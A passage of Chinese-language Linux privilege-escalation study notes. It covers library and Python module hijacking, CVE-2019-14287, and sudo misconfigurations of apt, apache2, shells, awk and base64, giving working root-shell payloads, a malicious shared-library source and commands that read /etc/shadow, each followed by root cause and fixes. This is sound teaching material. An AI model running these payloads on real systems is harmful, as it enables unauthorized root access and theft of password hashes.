+<p>该配置允许从 <code>/development</code> 文件夹加载库，该文件夹对所有用户可写。这种配置错误可以被利用，通过在 <code>/development</code> 中放置恶意库，它将优先于其他文件夹，因为该文件中的条目会首先被检查（在配置文件中列出的其他文件夹之前）。</p>
+<p>在编译库之前，我们需要找到二进制调用到的函数名称。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ldd payroll</span><br><span class="line"></span><br><span class="line">linux-vdso.so.1 (0x00007ffd22bbc000)</span><br><span class="line">libshared.so =&gt; /development/libshared.so (0x00007f0c13112000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./payroll </span><br><span class="line"></span><br><span class="line">./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery</span><br></pre></td></tr></table></figure>
+<p>我们可以将现有的库复制到 <code>development</code> 文件夹。运行 <code>ldd</code> 针对二进制文件会列出库的路径为 <code>/development/libshared.so</code> ，这意味着它存在漏洞。执行二进制文件会抛出一个错误，指出它找不到名为 <code>dbquery</code> 的函数。我们可以编译一个包含此函数的共享对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void dbquery() &#123;</span><br><span class="line">    printf(&quot;Malicious library loaded\n&quot;);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;/bin/sh -p&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>dbquery</code> 函数将我们的用户 ID 设置为 0（root），并且当调用 <code>/bin/sh</code> 时会执行。使用 GCC 来编译它。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc src.c -fPIC -shared -o /development/libshared.so</span><br></pre></td></tr></table></figure>
+<h2 id="python库劫持"><a href="#python库劫持" class="headerlink" title="python库劫持"></a>python库劫持</h2><p>Python 是世界上最流行和广泛使用的编程语言之一，已经在 IT 行业取代了许多其他编程语言。程序员如此喜欢 Python 有很多原因。其中之一是用户可以与庞大的库集合一起工作。</p>
+<p>前提：存在python解释器有sudo权限</p>
+<h3 id="写权限错误"><a href="#写权限错误" class="headerlink" title="写权限错误"></a>写权限错误</h3><p>一个或另一个 python 模块可能由于错误设置了所有用户的写权限。这允许对 python 模块进行编辑和操作，以便我们可以插入命令或函数来产生我们想要的结果。如果我们为导入此模块的 Python 脚本分配了 <code>SUID</code> / <code>SGID</code> 权限，我们的代码将自动被包含。</p>
+<p>如果我们查看 <code>mem_status.py</code> 脚本的设置权限，我们可以看到它有一个 <code>SUID</code> 设置。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l mem_status.py</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py</span><br></pre></td></tr></table></figure>
+<p>通过分析 <code>mem_status.py</code> Python 文件的权限，我们了解到我们可以执行这个脚本，并且我们也有权限查看脚本，读取其内容。</p>
+<p>一个简单的例子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import psutil</span><br><span class="line"></span><br><span class="line">available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total</span><br><span class="line"></span><br><span class="line">print(f&quot;Available memory: &#123;round(available_memory, 2)&#125;%&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>可以看出来它调用了<code>virtual_memory</code>这个方法<br>因此我们可以<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r &quot;def virtual_memory&quot; /usr/local/lib/python3.8/dist-packages/psutil/*</span><br></pre></td></tr></table></figure></p>
+<p>找到库后查看相关权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py</span><br></pre></td></tr></table></figure>
+<p>一旦发现存在写权限，便可以进行劫持<br>比如，写入<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;id&#x27;)</span><br></pre></td></tr></table></figure></p>
+<h3 id="库路径"><a href="#库路径" class="headerlink" title="库路径"></a>库路径</h3><p>在 Python 中，每个版本都有指定的库（ <code>modules</code> ）搜索和导入的顺序。Python 导入 <code>modules</code> 的顺序基于优先级系统，这意味着列表中靠前的路径优先于靠后的路径。我们可以通过发出以下命令来看到这一点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import sys; print(&quot;\n&quot;.join(sys.path))&#x27;</span><br></pre></td></tr></table></figure>
+<p>要使用这个变体，需要满足两个前提条件。</p>
+<ol>
+<li>被脚本导入的模块位于通过 <code>PYTHONPATH</code> 变量列出的低优先级路径之一下。</li>
+<li>我们必须对列表中优先级较高的某个路径拥有写入权限。</li>
+</ol>
+<p>因此，如果导入的模块位于列表较低的位置，并且我们的用户可以编辑更高优先级的路径，我们可以用自己的名称创建一个模块，并包含我们想要的函数。由于更高优先级的路径会先被读取并检查所讨论的模块，Python 会访问它找到的第一个模块并导入它，然后再到达原始和预期的模块。</p>
+<p>写入恶意脚本并运行调用相关库的脚本即可</p>
+<h1 id="授权机制提权"><a href="#授权机制提权" class="headerlink" title="授权机制提权"></a>授权机制提权</h1><h2 id="Sudo风暴"><a href="#Sudo风暴" class="headerlink" title="Sudo风暴"></a><code>Sudo</code>风暴</h2><h3 id="cve-2019-14287"><a href="#cve-2019-14287" class="headerlink" title="cve-2019-14287"></a><code>cve-2019-14287</code></h3><p>一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span><br><span class="line">#</span><br><span class="line"># Please consider adding local content in /etc/sudoers.d/ instead of</span><br><span class="line"># directly modifying this file.</span><br><span class="line">#</span><br><span class="line"># See the man page for details on how to write a sudoers file.</span><br><span class="line">#</span><br><span class="line">Defaults        env_reset</span><br><span class="line">Defaults        mail_badpass</span><br><span class="line">Defaults        secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="line"></span><br><span class="line"># Host alias specification</span><br><span class="line"></span><br><span class="line"># User alias specification</span><br><span class="line"></span><br><span class="line"># Cmnd alias specification</span><br><span class="line"></span><br><span class="line"># User privilege specification</span><br><span class="line">root    ALL=(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"># Allow members of group sudo to execute any command</span><br><span class="line">%sudo   ALL=(ALL:ALL) ALL</span><br><span class="line">test    ALL=(ALL, !root) /bin/bash</span><br><span class="line"># See sudoers(5) for more information on &quot;#include&quot; directives:</span><br><span class="line"></span><br><span class="line">#includedir /etc/sudoers.d</span><br></pre></td></tr></table></figure><br>用<code>sudo -l</code>表示是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">User user may run the following commands on this host:</span><br><span class="line"> (root) NOPASSWD: /usr/sbin/iftop </span><br><span class="line"> (root) NOPASSWD: /usr/bin/find </span><br><span class="line"> (root) NOPASSWD: /usr/bin/nano </span><br><span class="line"> (root) NOPASSWD: /usr/bin/vim </span><br><span class="line"> (root) NOPASSWD: /usr/bin/rvim </span><br><span class="line"> (root) NOPASSWD: /usr/bin/man </span><br><span class="line"> (root) NOPASSWD: /usr/bin/awk </span><br><span class="line"> (root) NOPASSWD: /usr/bin/less </span><br><span class="line"> (root) NOPASSWD: /usr/bin/ftp </span><br><span class="line"> (root) NOPASSWD: /usr/bin/nmap </span><br><span class="line"> (root) NOPASSWD: /usr/sbin/apache2 </span><br><span class="line"> (root) NOPASSWD: /bin/more </span><br><span class="line"> (root) NOPASSWD: /usr/sbin/tcpdump </span><br><span class="line"> (root) NOPASSWD: /usr/bin/exiftool </span><br><span class="line"> (ALL, !root) NOPASSWD: /bin/bash</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>当 <code>/etc/sudoers</code> 文件中配置了允许用户以<strong>除了 root 之外</strong>的任意用户身份执行命令时（即使用了 <code>!root</code> 关键字），攻击者可以通过指定一个特殊的用户 ID（<code>-1</code> 或 <code>4294967295</code>）来绕过这个限制，最终以 root 权限执行命令。</p>
+<h4 id="漏洞配置前置条件"><a href="#漏洞配置前置条件" class="headerlink" title="漏洞配置前置条件"></a>漏洞配置前置条件</h4><p>正如上方配置代码的第 16 行所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL, !root) NOPASSWD: /bin/bash</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>本意</strong>：允许用户以任何人的身份运行 <code>/bin/bash</code>，<strong>但是绝对不能</strong>以 root 身份运行。</li>
+<li><strong>缺陷</strong>：Sudo 在将用户 ID 转换为系统可识别的权限时存在逻辑缺陷。</li>
+</ul>
+<h4 id="漏洞利用-Exploitation"><a href="#漏洞利用-Exploitation" class="headerlink" title="漏洞利用 (Exploitation)"></a>漏洞利用 (Exploitation)</h4><p>要利用此漏洞，只需要在执行 sudo 命令时，通过 <code>-u#</code> 参数指定用户 ID 为 <code>-1</code> 或其无符号整数等效值 <code>4294967295</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#-1 /bin/bash</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#4294967295 /bin/bash</span><br></pre></td></tr></table></figure>
+<p>执行上述命令后，通过 <code>id</code> 命令验证，你会发现自己已经拿到了 root 权限 (<code>uid=0(root)</code>)。</p>
+<h4 id="漏洞原理-Root-Cause"><a href="#漏洞原理-Root-Cause" class="headerlink" title="漏洞原理 (Root Cause)"></a>漏洞原理 (Root Cause)</h4><ol>
+<li>当我们使用 <code>sudo -u#-1</code> 时，sudo 会尝试以 UID 为 <code>-1</code> 的身份运行命令。</li>
+<li>在 Linux 系统底层的 C 语言库中，用于更改用户身份的函数（如 <code>setresuid</code> 等）会将 <code>-1</code> 视为一个特殊值，表示“不要更改当前的 User ID”。</li>
+<li>因为 sudo 本身是一个具有 SUID 权限的程序（它启动时是 root 权限），当它错误地将 <code>-1</code> 解释为不改变当前权限时，它实际上保持了其自身的 <code>uid=0</code>（root 权限）。</li>
+<li>同时，由于我们在命令行输入的是 <code>-1</code> 而不是 <code>root</code> 或 <code>0</code>，sudo 的策略解析器被欺骗了，它认为我们并没有违反 <code>!root</code> 的规则，从而放行了命令。<h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4></li>
+</ol>
+<p>将 Sudo 升级到 <code>1.8.28</code> 或更高版本。新版本修复了对用户 ID 字符串到数字的解析逻辑，不再允许通过这种方式绕过。</p>
+<h3 id="sudo-apt-apt-get-aptitude"><a href="#sudo-apt-apt-get-aptitude" class="headerlink" title="sudo apt/apt-get/aptitude"></a><code>sudo apt/apt-get/aptitude</code></h3><p>这并非程序代码的安全漏洞，而是属于 <strong>GTFOBins (Living Off The Land Binaries)</strong> 的一种典型利用。当系统管理员配置不当，允许普通用户通过 <code>sudo</code> 免密执行 <code>apt</code>、<code>apt-get</code> 或 <code>aptitude</code> 命令时，攻击者可以利用包管理器的内置配置覆盖功能，执行任意系统命令，从而获取 Root 权限。</p>
+<h4 id="漏洞利用-Exploitation-1"><a href="#漏洞利用-Exploitation-1" class="headerlink" title="漏洞利用 (Exploitation)"></a>漏洞利用 (Exploitation)</h4><p>利用包管理器特有的 <code>-o</code> (Option) 参数，在执行正常的更新或安装动作之前，强行插入并执行一个 Shell。</p>
+<p><strong>Payload:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 使用 apt 提权</span><br><span class="line">sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash</span><br><span class="line"></span><br><span class="line"># 使用 apt-get 提权 (常用于无交互环境)</span><br><span class="line">sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash</span><br></pre></td></tr></table></figure>
+<p>执行后，系统会直接弹出一个具有 Root 权限的 Bash Shell。</p>
+<h4 id="漏洞原理-Root-Cause-1"><a href="#漏洞原理-Root-Cause-1" class="headerlink" title="漏洞原理 (Root Cause)"></a>漏洞原理 (Root Cause)</h4><ol>
+<li><strong>底层共享机制：</strong> 在 Debian/Ubuntu 体系中，<code>apt</code>、<code>apt-get</code> 和 <code>aptitude</code> 虽然前端表现不同，但底层都调用了相同的核心 C++ 库 <code>libapt-pkg</code>。</li>
+<li><strong>Hook 机制滥用：</strong> APT 系统设计了预执行 (<code>Pre-Invoke</code>) 和后执行 (<code>Post-Invoke</code>) 的 Hook 机制，本意是方便管理员在安装软件前后自动执行备份或重启服务等脚本。</li>
+<li><strong>参数覆盖 (<code>-o</code>)：</strong> <code>-o</code> 参数允许用户在命令行中临时覆盖默认的 APT 配置文件。</li>
+<li><strong>权限继承：</strong> 当我们使用 <code>sudo</code> 运行命令时，程序以 Root 权限启动。此时我们将 <code>APT::Update::Pre-Invoke</code> 强行指向 <code>/bin/bash</code>，<code>libapt-pkg</code> 就会以当前的 Root 权限去执行这个 Hook，最终导致权限提升。</li>
+</ol>
+<h4 id="修复方案与防范"><a href="#修复方案与防范" class="headerlink" title="修复方案与防范"></a>修复方案与防范</h4><ul>
+<li><strong>根本原则：</strong> 遵循最小权限原则（PoLP），<strong>绝不要</strong>在 <code>/etc/sudoers</code> 中给予普通用户直接运行 <code>apt</code> 或 <code>apt-get</code> 的 <code>sudo</code> 权限。</li>
+<li><strong>替代方案：</strong> 如果确实需要让普通用户执行系统更新，应该编写一个严格受限的 Bash 脚本（脚本内写死 <code>apt-get update &amp;&amp; apt-get upgrade</code>），并只允许用户 <code>sudo</code> 执行该特定脚本，而不是直接开放 <code>apt</code> 二进制文件的执行权限。</li>
+</ul>
+<h3 id="sudo-apache2"><a href="#sudo-apache2" class="headerlink" title="sudo apache2"></a><code>sudo apache2</code></h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>通过滥用具有 <code>sudo</code> 权限的 <code>apache2</code> 二进制文件，攻击者可以实现<strong>越权任意文件读取</strong>。在这个案例中，攻击者成功读取了本应只有 Root 才能查看的系统密码本 <code>/etc/shadow</code>，泄露了 Root 用户的密码 Hash，为后续的离线密码破解铺平了道路。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用 <code>apache2</code> 的 <code>-f</code> 参数（用于指定备用的配置文件），强制它以 Root 权限去加载目标敏感文件。</p>
+<p><strong>Payload:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apache2 -f /etc/shadow</span><br></pre></td></tr></table></figure>
+<p>执行后，由于 <code>/etc/shadow</code> 的内容根本不符合 Apache 配置文件的语法规范，Apache 解析失败并报错退出。 <strong>但是关键点在于</strong>：Apache 在抛出语法错误（Syntax error）时，为了方便排错，会将被认为“有语法错误”的那行内容原样打印在终端上。这使得文件的第一行（通常正是 root 用户的密码 Hash）被成功泄露出来。</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ol>
+<li><strong>权限继承：</strong> 通过 <code>sudo</code> 执行，<code>apache2</code> 进程是以 Root 权限启动运行的，因此它畅通无阻地读取了 <code>/etc/shadow</code>。</li>
+<li><strong>报错机制被滥用：</strong> 程序的报错提示逻辑原本是为了方便管理员 Debug，却被攻击者巧妙地转化为了一种“带外数据提取”（Data Exfiltration）的通道。把“目标文件”当成“配置文件”喂给程序，利用报错信息把内容“吐”出来。</li>
+<li><strong>后续攻击：</strong> 拿到 <script type="math/tex">6</script> 开头的 SHA-512 Hash 字符串后，攻击者就可以将其保存到本地，使用 John the Ripper 或 Hashcat 等工具进行离线暴力破解，从而获取真实的 root 密码。</li>
+</ol>
+<h4 id="修复方案与防范-1"><a href="#修复方案与防范-1" class="headerlink" title="修复方案与防范"></a>修复方案与防范</h4><ul>
+<li><strong>遵循最小权限原则：</strong> 如果普通用户（如开发人员）只需要管理网站服务的启停，<strong>绝对不应该</strong>在 <code>/etc/sudoers</code> 中赋予直接运行底层二进制文件 <code>sudo /usr/sbin/apache2</code> 的权限。</li>
+<li><strong>正确配置 Sudoers：</strong> 应该只允许执行特定的、受限的服务管理命令，例如： <code>user ALL=(root) NOPASSWD: /bin/systemctl restart apache2</code> 这样用户就只能重启服务，而无法利用程序本身的参数去执行恶意操作。</li>
+</ul>
+<h3 id="sudo-ash-bash-zsh-sh等"><a href="#sudo-ash-bash-zsh-sh等" class="headerlink" title="sudo ash/bash/zsh/sh等"></a><code>sudo ash/bash/zsh/sh等</code></h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>当系统管理员在配置 <code>/etc/sudoers</code> 时犯了极其低级的错误，直接将某个 Shell 程序（如 <code>/bin/ash</code>, <code>/bin/bash</code>, <code>/bin/sh</code> 等）的 <code>sudo</code> 执行权限授予了普通用户，攻击者就可以直接通过该程序生成一个具有 Root 权限的交互式命令行环境。这是 GTFOBins 中最直观的 <strong>Shell 逃逸/直接提权</strong>。</p>
+<h4 id="漏洞利用-Exploitation-2"><a href="#漏洞利用-Exploitation-2" class="headerlink" title="漏洞利用 (Exploitation)"></a>漏洞利用 (Exploitation)</h4><p>无需任何复杂的参数或环境配置，直接带上 <code>sudo</code> 执行该 Shell 即可。</p>
+<p><strong>Payload:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ash</span><br></pre></td></tr></table></figure>
+<p>同理，如果是其他 Shell，就是 <code>sudo bash</code>, <code>sudo sh</code>, <code>sudo zsh</code> 等</p>
+<p>执行该命令后，你会发现终端的提示符通常会从 <code>$</code> 变成 <code>#</code>，输入 <code>id</code> 命令可以确认已经获取到 <code>uid=0(root)</code> 权限。</p>
+<h4 id="漏洞原理-Root-Cause-2"><a href="#漏洞原理-Root-Cause-2" class="headerlink" title="漏洞原理 (Root Cause)"></a>漏洞原理 (Root Cause)</h4><ol>
+<li><strong>程序的本质：</strong> <code>ash</code> 是一个命令解释器，它的核心功能就是接收用户的输入，并在当前用户的权限上下文中执行这些命令。</li>
+<li><strong>权限继承：</strong> <code>sudo</code> 的机制就是以目标用户（默认为 Root）的身份拉起一个进程。当我们执行 <code>sudo ash</code> 时，实际上是在告诉系统：“请以 Root 身份为我启动一个全新的命令行窗口”。</li>
+<li><strong>合法但致命：</strong> 这完全不是漏洞，而是 <code>sudo</code> 和 <code>ash</code> 在正常发挥它们各自的功能。这是一种典型的<strong>配置逻辑缺陷</strong>，攻击者只是顺水推舟，利用了这个合法拉起的 Root 环境。</li>
+</ol>
+<h4 id="修复方案与防范-2"><a href="#修复方案与防范-2" class="headerlink" title="修复方案与防范"></a>修复方案与防范</h4><ul>
+<li><strong>绝对的红线：</strong> <strong>永远不要</strong>在 <code>/etc/sudoers</code> 中允许普通用户使用 <code>sudo</code> 去执行任何可以提供交互式 Shell 的二进制文件（包括但不限于 <code>/bin/bash</code>, <code>/bin/sh</code>, <code>/bin/ash</code>, <code>/bin/zsh</code>, <code>/bin/dash</code>，甚至包括带有执行外部命令功能的文本编辑器如 <code>vim</code>, <code>nano</code>）。</li>
+<li><strong>坚持最小权限原则 (PoLP)：</strong> 如果普通用户确实需要特权，在 <code>sudoers</code> 中必须精确到<strong>具体程序的绝对路径</strong>，甚至限制到<strong>具体的运行参数</strong>。例如，如果只允许重启 Nginx，应该配置为： <code>user ALL=(root) NOPASSWD: /bin/systemctl restart nginx</code></li>
+</ul>
+<h3 id="sudo-awk"><a href="#sudo-awk" class="headerlink" title="sudo awk"></a><code>sudo awk</code></h3><p><code>awk</code> 是一款强大的 Linux 文本分析和处理工具。然而，由于它内置了调用系统底层命令的函数，如果管理员在 <code>/etc/sudoers</code> 中不慎将 <code>awk</code> 的 <code>sudo</code> 执行权限授予了普通用户，攻击者就可以利用该内置函数，直接派生出一个具有 Root 权限的交互式 Shell。</p>
+<h4 id="漏洞利用-Exploitation-3"><a href="#漏洞利用-Exploitation-3" class="headerlink" title="漏洞利用 (Exploitation)"></a>漏洞利用 (Exploitation)</h4><p>利用 <code>awk</code> 的 <code>BEGIN</code> 规则和内置的 <code>system()</code> 函数来执行提权 Payload。</p>
+<p><strong>Payload:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>
+<p>(如果在某些精简系统中没有 bash，可以替换为 <code>/bin/sh</code>)<br>执行后，<code>awk</code> 会在处理任何文本输入之前，直接执行 <code>system()</code> 里的命令，为你弹出一个 Root 权限的终端提示符。</p>
+<h4 id="漏洞原理-Root-Cause-3"><a href="#漏洞原理-Root-Cause-3" class="headerlink" title="漏洞原理 (Root Cause)"></a>漏洞原理 (Root Cause)</h4><ol>
+<li><strong><code>BEGIN</code> 代码块：</strong> 在 <code>awk</code> 的语法中，<code>BEGIN &#123; ... &#125;</code> 块内的代码会在读取和处理任何标准输入数据之前被优先执行。这意味着我们不需要给 <code>awk</code> 提供任何实际的文本文件，它就会执行我们的代码。</li>
+<li><strong><code>system()</code> 函数特性：</strong> <code>awk</code> 提供了一个名为 <code>system()</code> 的内置函数，它的作用是将括号内的字符串传递给系统的命令解释器（通常是 <code>/bin/sh</code>）去执行。</li>
+<li><strong>权限继承：</strong> 当我们使用 <code>sudo</code> 启动 <code>awk</code> 时，<code>awk</code> 进程是以 Root 权限运行的。当这个 Root 权限的 <code>awk</code> 调用 <code>system(&quot;/bin/bash&quot;)</code> 时，新创建的 <code>bash</code> 子进程完美继承了父进程的 Root 权限，从而完成了越权逃逸。</li>
+</ol>
+<h4 id="修复方案与防范-3"><a href="#修复方案与防范-3" class="headerlink" title="修复方案与防范"></a>修复方案与防范</h4><ul>
+<li><strong>安全红线：</strong> <strong>绝不</strong>在 <code>/etc/sudoers</code> 中允许普通用户直接通过 <code>sudo</code> 执行像 <code>awk</code>, <code>sed</code>, <code>tar</code>, <code>find</code> 这样具有内部命令执行或参数调用功能的复杂工具。</li>
+<li><strong>脚本化封装：</strong> 如果业务上确实需要普通用户以 Root 权限运行一段特定的 <code>awk</code> 文本处理逻辑，应当将这段完整的逻辑写死在一个外部 Shell 脚本中（例如 <code>/usr/local/bin/log_parser.sh</code>），将该脚本的权限设置为仅 Root 可写，然后在 <code>sudoers</code> 中只允许用户 <code>sudo</code> 执行该特定的脚本文件。</li>
+</ul>
+<h3 id="sudo-base64"><a href="#sudo-base64" class="headerlink" title="sudo base64"></a><code>sudo base64</code></h3><h4 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p><code>base64</code> 是 Linux 中用于将二进制或文本数据进行 Base64 编码和解码的基础命令行工具。如果管理员不慎将其加入了 <code>sudo</code> 免密执行名单，攻击者就可以利用它以 Root 身份读取系统中的任意敏感文件（例如 <code>/etc/shadow</code> 或 <code>/root/.ssh/id_rsa</code> 等）。</p>
+<h4 id="漏洞利用-Exploitation-4"><a href="#漏洞利用-Exploitation-4" class="headerlink" title="漏洞利用 (Exploitation)"></a>漏洞利用 (Exploitation)</h4><p>利用 <code>base64</code> 去读取受限文件并进行编码，然后通过管道符 <code>|</code> 交给当前普通用户权限的 <code>base64</code> 进行解码，从而在终端直接输出文件明文。</p>
+<p><strong>Payload:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 读取并还原 /etc/shadow 文件内容</span><br><span class="line">sudo base64 /etc/shadow | base64 --decode</span><br></pre></td></tr></table></figure>
+<p>执行后，原本对普通用户绝对不可读的系统密码 Hash 就会被完整打印在屏幕上，供后续离线破解使用。</p>
+<h4 id="漏洞原理-Root-Cause-4"><a href="#漏洞原理-Root-Cause-4" class="headerlink" title="漏洞原理 (Root Cause)"></a>漏洞原理 (Root Cause)</h4><ol>
+<li><strong>权限继承与文件读取：</strong> 当执行 <code>sudo base64 /etc/shadow</code> 时，前半段命令以 Root 权限运行，它畅通无阻地打开并读取了 <code>/etc/shadow</code>，然后将文件内容转换成了 Base64 字符串输出到标准输出（stdout）。</li>
+<li><strong>巧妙的还原：</strong> 管道符 <code>|</code> 后面的 <code>base64 --decode</code> 是以当前普通用户的权限运行的。它接收了前半段发来的那串已经编码好的无害字符串，并将其解码还原成原本的明文格式。</li>
+<li><strong>绕过限制：</strong> 系统底层的权限控制只拦截了普通用户“读取 <code>/etc/shadow</code>”的动作，但并没有拦截普通用户“接收并解码一串 Base64 文本”的动作，从而实现了数据窃取（Data Exfiltration）。</li>
+</ol>
+<h4 id="修复方案与防范-4"><a href="#修复方案与防范-4" class="headerlink" title="修复方案与防范"></a>修复方案与防范</h4><ul>
+<li><strong>坚持最小权限原则：</strong> <strong>绝对不要</strong>在 <code>/etc/sudoers</code> 中赋予任何用于读取、编辑、或转换文件内容的工具（如 <code>base64</code>, <code>cat</code>, <code>less</code>, <code>more</code>, <code>head</code>, <code>tail</code>, <code>strings</code> 等）直接执行的 <code>sudo</code> 权限。</li>
+<li><strong>业务分离：</strong> 如果业务场景真的需要普通用户对某个特定的 Root 权限文件进行 Base64 编码，应该编写一个功能被严格限制的 Shell 脚本，脚本中写死只能操作那个特定文件，然后只允许用户 <code>sudo</code> 运行该脚本。</li>
+</ul>
+<h3 id="sudo-cp"><a href="#sudo-cp" class="headerlink" title="sudo cp"></a><code>sudo cp</code></h3><p>这是一个非常危险且破坏性极强的提权点。<code>cp</code>（copy）命令本身非常简单，但当它被赋予了 <code>sudo</code> 权限后，就变成了一把可以随意篡改系统底层的“万能钥匙”。</p>
+<p>与之前 <code>base64</code> 只能“读”不同，<code>cp</code> 不仅能“读”，还能“写（覆盖）”。你可以直接将以下内容补充到你的笔记中：</p>
+<h4 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p><code>cp</code> 是 Linux 系统中用于复制文件和目录的基础命令。如果管理员在 <code>/etc/sudoers</code> 中错误地允许普通用户免密执行 <code>sudo cp</code>，攻击者不仅可以将系统中任意高度敏感的文件（如 <code>/etc/shadow</code>, <code>id_rsa</code>）复制出来读取，更致命的是，<strong>它可以将恶意伪造的配置文件覆盖到系统关键路径</strong>，从而直接劫持系统权限。</p>
